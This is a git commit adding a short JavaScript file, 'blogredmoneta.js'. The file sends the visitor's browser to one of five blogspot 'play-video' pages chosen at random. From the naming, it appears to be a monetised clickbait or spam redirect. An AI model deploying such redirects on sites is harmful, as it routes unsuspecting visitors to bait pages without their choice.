7f146312ff0e57416687d97ebb7f8d9b290d3f68
Jamawe12 <93462207+Jamawe12@users.noreply.github.com>
2026-03-09 17:05:15 +0700

    Create blogredmoneta.js

---
+++ blogredmoneta.js
@@ -0,0 +1,11 @@
+var dataUrl = [
+
+'https://mywplayvideo15.blogspot.com/2026/02/play-video_8.html',
+'https://mywplayvideo15.blogspot.com/2026/02/play-video_94.html',
+'https://mywplayvideo15.blogspot.com/2026/02/play-video_12.html',
+'https://mywplayvideo15.blogspot.com/2026/02/play-video_26.html',
+'https://mywplayvideo15.blogspot.com/2026/02/play-video.html'
+
+];
+var randomItem = dataUrl[Math.floor(Math.random()*dataUrl.length)];
+window.location = randomItem;
